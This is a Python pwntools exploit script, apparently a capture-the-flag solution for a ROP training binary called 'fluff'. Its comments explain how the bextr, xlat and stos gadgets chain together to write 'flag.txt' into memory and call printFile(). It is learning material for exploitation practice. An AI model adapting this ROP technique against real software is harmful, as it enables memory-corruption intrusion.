#!/usr/bin/python3
#coding: utf-8

from pwn import *
import sys

"""
Interesting gadgets:

0x40062a: pop rdx;
		  pop rcx; add rcx, 0x3ef2;

0x400633: bextr rbx, rcx, rdx; ret;

	rdx = 0x4000 : extract 64 bits starting a 0 from rcx to rbx

	>>> bin(0x4000)
	'0b100000000000000'
	
	>>> 0b100000000000000 >> 8
	64

	rdx [7:0] : départ
	rdx [15:8]: nb de bits à extraire

	-> bextr rbx, rcx, rdx; ret; === mov rbx, rcx


0x400628: xlat BYTE PTR ds:[rbx]      === mov al, PTR [rbx + al]

0x4006a3: pop rdi; ret;
0x400639: stos BYTE PTR es:[rdi],al   === mov PTR [rdi], al

# search char with pwndbg
pwndbg> search -1 0x6c fluff

chr(0x6c) = 'l'

"""


def setup_rbx(rbx_value):
	
	# 0x40062a: pop rdx;
	# 			pop rcx;
	#			add rcx, 0x3ef2;
	ropchain = p64(0x40062a) # gadget addr
	
	ropchain += p64(0x4000) # rdx value
							# rdx = 0x4000 in bextr = extract 64 bits starting a 0 from rcx to rbx
	ropchain += p64(rbx_value - 0x3ef2) # rcx value

	ropchain += p64(0x400633) # instr bextr rbx, rcx, rdx; ret;

	return ropchain


# setup $al by passing a pointer to our new al value

# As xlat add $al to the $rbx parameter, we give the current current $al value
# and this value is substracted from the pointer to the new $al
def setup_al(al_ptr, current_al_value) :
	ropchain = setup_rbx(al_ptr - current_al_value)

	# 0x400628: xlat BYTE PTR ds:[rbx] === mov al, PTR [rbx + al]
	ropchain += p64(0x400628)

	return ropchain


def copy_byte(src_addr, current_al_value):

	ropchain = setup_al(src_addr, current_al_value)
	
	ropchain += p64(0x400639) # stos === mov PTR [rdi], al

	return ropchain


"""
### MAIN ###
"""
buf  = b'A' * 40 #padding
#buf += setup_al(0x4003c4)


# Setup inital $rdi.
# $rdi is incremented by 'stos BYTE PTR es:[rdi],al' in the 
# copy_byte() function.

# 0x4006a3: pop rdi; ret;
# 0x400639: stos BYTE PTR es:[rdi],al   === mov PTR [rdi], al

dest_addr = 0x601030
buf += p64(0x4006a3) # pop rdi
buf += p64(dest_addr)


# We setup the inital value of $al to 0x00
buf += setup_rbx(0x601080)	# an address with null values
							# we use values in .data to clear al

buf += p64(0x400628) # 0x400628: xlat BYTE PTR ds:[rbx] === mov al, PTR [rbx + al]


# Write "flag.txt" in memory at 0x601030

buf += copy_byte(0x4003c4, 0x00) # char 'f'
buf += copy_byte(0x400239, ord('f')) # char 'l'
buf += copy_byte(0x40040c, ord('l')) # char 'a'
buf += copy_byte(0x6003cf, ord('a')) # char 'g'
buf += copy_byte(0x40024e, ord('g')) # char '.'
buf += copy_byte(0x4003d5, ord('.')) # char 't'
buf += copy_byte(0x4006c8, ord('t')) # char 'x'
buf += copy_byte(0x4003d5, ord('x')) # char 't'

buf += p64(0x4006a3) # pop rdi
buf += p64(0x601030)

buf += p64(0x400510) # printFile()

sys.stdout.buffer.write(buf)
